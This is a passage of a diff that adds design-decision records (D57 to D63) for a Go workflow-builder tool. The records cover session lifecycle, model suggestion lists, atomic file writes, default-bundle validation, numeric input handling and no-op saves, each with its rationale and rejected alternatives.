+- **Rationale:** UX round 2 F73 flagged that "clear error" in the Edge Cases table was not a behavioral commitment — a `%v` dump of an OS error would technically satisfy "clear" while leaving users stranded. The four-element template aligns the Edge Cases table errors with the alternate-flow error dialogs, which already follow this shape (editor-spawn failure, parse-error recovery).
+- **Evidence:** UX round 2 F73. Nielsen heuristic 9 (help users recover from errors).
+- **Rejected alternatives:**
+  - Let implementation write the message — guarantees inconsistency.
+  - Three-element template (omit in-memory state commitment) — omits the most user-important reassurance.
+- **Linked technical notes:** —
+- **Driven by findings:** F73
+- **Dependent decisions:** —
+- **Referenced in spec:** Edge Cases table (all rows); User Interactions — Error states
+
+## D57: Session definition and target switching
+
+- **Question:** What starts and ends a builder session, and does session state persist across target switches within a running builder?
+- **Decision:** A **session** begins when the user reaches the edit view and ends when the builder process exits or the user explicitly returns to the landing page. Session-scoped state includes: acknowledged warnings (D23), external-workflow first-save confirmation (D22), symlink first-save confirmation (D17), the unsaved-changes indicator, the outline scroll position, and collapse state (D28). **Returning to the landing page from the edit view ends the current session** — all session-scoped state is discarded; picking a new target starts a fresh session. If the edit view has unsaved changes at the moment the user invokes "return to landing," the unsaved-changes dialog (D7, D54) intercepts first; only after the user confirms discard or successful save does the return to landing proceed and the session end.
+- **Rationale:** UX round 2 F74 and edge-case round 2 F75 / F76 flagged that "session" was used everywhere in the spec without a definition, leaving the cross-target behavior undefined. The chosen semantics ("returning to landing ends the session") is the simpler model — no session bleed, no cross-target suppression state. NF-17 in the edge-case round separately flagged that an accidental return-to-landing without a confirmation guard would discard edits silently; wrapping the return action behind the unsaved-changes dialog closes that loss path.
+- **Evidence:** UX round 2 F74. Edge-case round 2 F75, F76 (NF-17 silent edit discard).
+- **Rejected alternatives:**
+  - Session persists across target switches — complicates suppression semantics; users would be surprised that a previously-acknowledged warning from target A remains suppressed after switching to target B.
+  - No confirmation before return-to-landing — silent edit loss.
+- **Linked technical notes:** —
+- **Driven by findings:** F74, F75, F76
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow; new Session Lifecycle paragraph; Alternate Flows — Target switching
+
+## D58: Model suggestion list maintenance
+
+- **Question:** Who maintains the `model` field's suggestion list and how fresh does it stay?
+- **Decision:** The suggestion list is a hardcoded snapshot at ship time drawn from Anthropic's then-current Claude model identifiers. No update contract attaches to the list — it is explicitly documented as potentially stale. The field accepts any string the user types, regardless of whether it matches a suggestion (D12 already commits to this; the schema does not constrain model values). The how-to guide (`docs/how-to/using-the-workflow-builder.md`, part of Documentation Obligations) includes a note that the suggestion list is illustrative, not authoritative, and points users to Anthropic's model reference for the current set.
+- **Rationale:** Adversarial round 2 F77 flagged that D12 committed to a "suggestion list of known-good values" without any maintenance contract — a hardcoded list in Go will go stale within months of shipping. The choice here is to be honest rather than invent a maintenance process the project cannot guarantee. The value of the suggestion list is as a starting hint for users new to Claude model names; if it is stale, the user can still type the correct name and the validator accepts it.
+- **Evidence:** Adversarial round 2 F77. D12 (model field free-text).
+- **Rejected alternatives:**
+  - Build a dynamic update mechanism — out of scope for v1 and introduces a network dependency.
+  - Remove the suggestion list entirely — loses the starting-hint value for new users.
+  - Declare a maintenance cadence the project will not follow — sets up false expectations.
+- **Linked technical notes:** —
+- **Driven by findings:** F77
+- **Dependent decisions:** —
+- **Referenced in spec:** User Interactions — Feedback note; Documentation Obligations (how-to guide note)
+
+## D59: Coding-standards entry for save-durability pattern
+
+- **Question:** Does the Documentation Obligations list include a coding-standards entry for T1, or only an ADR?
+- **Decision:** Documentation Obligations is extended to include both an ADR recording the decision to adopt the atomic-save pattern AND a coding-standards entry at `docs/coding-standards/file-writes.md` (or equivalent, named at implementation time) codifying when and how the pattern must be used across the codebase. The ADR records the decision; the coding-standards entry codifies the rule for future contributors.
+- **Rationale:** Jr round 2 F78 flagged that T1's closing sentence recommends codifying the pattern in coding standards, but the Documentation Obligations list mentioned only the ADR. An ADR and a coding-standards entry serve different audiences — ADR for history and rationale, coding-standards for day-to-day guidance. Shipping one without the other leaves the pattern discoverable from the ADR but not enforceable as a standard.
+- **Evidence:** Jr round 2 F78. T1 tech-note text.
+- **Rejected alternatives:**
+  - ADR only — rule is not discoverable by contributors who skim `docs/coding-standards/`.
+  - Coding-standards entry only — history and rationale missing.
+- **Linked technical notes:** T1
+- **Driven by findings:** F78
+- **Dependent decisions:** —
+- **Referenced in spec:** Documentation Obligations
+
+## D60: Companion-file write atomicity
+
+- **Question:** When the user saves a workflow for the first time (after scaffolding or after creating new prompt/script files during the session), what atomicity contract applies to the companion-file writes?
+- **Decision:** The T1 atomic-rename pattern applies to every file the save writes, not only to the configuration file. Companion-file writes — newly created prompt files, newly created scripts, modified statusLine scripts — each use the same temp-file-plus-rename sequence as the configuration file. The save sequence writes every companion file first (each under its own atomic rename), then the configuration file last (also under its atomic rename). This ordering ensures that if the configuration save succeeds, every companion file it references is already on disk; if the configuration save fails, the companion files are already in place but the configuration still points to the prior state, so the user can retry. A partial failure during the companion-file phase (e.g., disk full on the 3rd of 5 new files) is surfaced in the save-failure error dialog naming the failing file; the user can retry after freeing space.
+- **Rationale:** Jr round 2 F79 flagged that T1 committed to atomic configuration file save but the scaffold-from-empty alternate flow writes companion files at the same save, and the original spec was silent on their atomicity. A non-atomic companion write creates the exact tear-on-crash problem T1 was introduced to prevent — just moved to the companion files. The write-companion-then-config ordering is the safe sequence: companion files are referenced by the config, so committing them before committing the config reference ensures no dangling references.
+- **Evidence:** Jr round 2 F79. T1 (atomic rename pattern).
+- **Rejected alternatives:**
+  - Companion files written directly (O_TRUNC) — creates partial-write risk on a crash.
+  - Config written before companion files — dangling references on partial save.
+- **Linked technical notes:** T1
+- **Driven by findings:** F79
+- **Dependent decisions:** —
+- **Referenced in spec:** Alternate Flows — Scaffold-from-empty; Edge Cases table
+
+## D61: Default-bundle reference-integrity check before copy
+
+- **Question:** What happens when the user picks "copy from default" and the default bundle itself has a referenced-but-missing companion file?
+- **Decision:** Before the copy begins, the builder validates the default bundle's internal reference integrity: every prompt and script referenced by config.json must exist in the default bundle. If any are missing, the builder shows an error dialog naming the missing files and offers two actions: **Copy anyway** (proceeds with the partial copy; user enters edit view with the validator's fatal findings for the missing files already known), or **Cancel** (returns to landing). The copy never enters edit view silently with a latent fatal.
+- **Rationale:** Jr round 2 F80 flagged that D15 described the copy scope but said nothing about a default bundle that is itself broken (a stale config reference the shipped default never cleaned up). An always-copy approach would let the user discover the problem only after landing on the edit view with an immediate validation failure — confusing, because they asked for the default. Surfacing the problem at landing lets them decide whether to proceed or investigate.
+- **Evidence:** Jr round 2 F80. D15 (copy scope).
+- **Rejected alternatives:**
+  - Refuse to copy when default is broken — strands users whose shipped default has a known issue.
+  - Silent copy with latent fatal — poor discoverability.
+- **Linked technical notes:** —
+- **Driven by findings:** F80
+- **Dependent decisions:** —
+- **Referenced in spec:** Alternate Flows — Copy-default-to-local
+
+## D62: Numeric field non-numeric input behavior
+
+- **Question:** When the user types a non-numeric character into a numeric field (e.g., a letter into `timeoutSeconds`), what happens?
+- **Decision:** Non-numeric characters are silently ignored at input time. The field accepts only digits (and a leading `-` if the field permits negative values — none of the current schema's numeric fields do). No error is shown; the keystroke has no visible effect. Numeric fields also accept `Backspace` and cursor navigation keys normally. Paste with a non-numeric character in the middle is sanitized: digits before the first non-digit character are accepted, everything from the first non-digit onward is discarded, and the "pasted content sanitized" message (D42) fires.
+- **Rationale:** Edge-case round 2 F81 flagged that D42 specifies paste-time sanitization but says nothing about typed non-numeric characters. Silent ignore is the least-surprising behavior for a numeric field — matches most GUI numeric-only inputs, avoids an error flood during normal typing, and does not swallow valid navigation keys.
+- **Evidence:** Edge-case round 2 F81. D42 (input sanitization).
+- **Rejected alternatives:**
+  - Echo the character and show an error — creates an error flood on every stray keystroke.
+  - Accept the character and reject at save time — user has no input-time feedback.
+  - Reject with audible bell — most terminals do not have a bell, and those that do have it disabled.
+- **Linked technical notes:** —
+- **Driven by findings:** F81
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 7; Edge Cases table
+
+## D63: No-op save behavior
+
+- **Question:** What happens when the user invokes save and the in-memory state is identical to what is on disk (no changes since load or since last save)?
+- **Decision:** The builder detects no-change state by comparing the in-memory serialization against the on-disk configuration file bytes (both already parsed). If they are identical, save is a **no-op**: the file is not rewritten, validation does not run, no temp file is created, the D41 mtime snapshot is not refreshed (there's no new write to snapshot against), and the success-state feedback per D53 shows `No changes to save` in place of `Saved at HH:MM:SS`.
+- **Rationale:** Edge-case round 2 F82 flagged that an always-rewrite save would change the file mtime on every save invocation, producing spurious conflict dialogs for concurrent observers (other builder sessions, tools watching the file). A true no-op preserves the file's last-written-by-intent mtime and avoids unnecessary disk I/O. Running validation on unchanged state would also be wasted work — the state already passed validation when it was last saved.
+- **Evidence:** Edge-case round 2 F82. D41 (mtime snapshot).
+- **Rejected alternatives:**
+  - Always rewrite — changes mtime spuriously.
+  - Disable the save affordance when unchanged — hides the user's ability to confirm they meant the current state.
+- **Linked technical notes:** —
+- **Driven by findings:** F82
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 9; Edge Cases table
